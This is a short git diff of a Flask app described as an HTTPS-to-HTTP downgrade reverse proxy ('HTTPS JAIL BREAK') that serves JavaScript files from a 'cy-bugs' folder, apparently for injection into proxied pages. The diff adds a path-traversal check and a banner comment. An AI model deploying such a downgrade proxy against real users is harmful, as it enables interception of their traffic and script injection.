@@ -1,11 +1,14 @@
-from flask import Flask, request,make_response
+#⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️
+# written by Idan.M 
+# reverse proxy for downgrading the connection from https to http
 
+
+
+from flask import Flask, request,make_response
 import requests
 import proxy_utils 
 import logging
 import os 
-
-
 import proxy_parser 
 app = Flask(__name__)
 PORT = 80
@@ -41,11 +44,11 @@ def wellcome():
 def cybugsServe(path):
      script = "Error" 
      response = None
+     if "/" in path or ".." in path  : 
+          return "You cant do LFI g - repoterd to the admin..." , 404
      try : 
           with open(f"../cy-bugs/{path}" , 'r') as file:
-               
                script= "".join(filter(lambda x : not x.startswith("//") and x.strip("\n") ,file.readlines()))
-
           response = make_response(script)
           response.headers['content-type'] = "text/javascript"
           response.status_code = 200 
@@ -87,6 +90,5 @@ def proxy(path):
      return returnData , code , headers 
   
      
-
 if __name__ == '__main__':
     app.run(host=HOST,port=PORT)
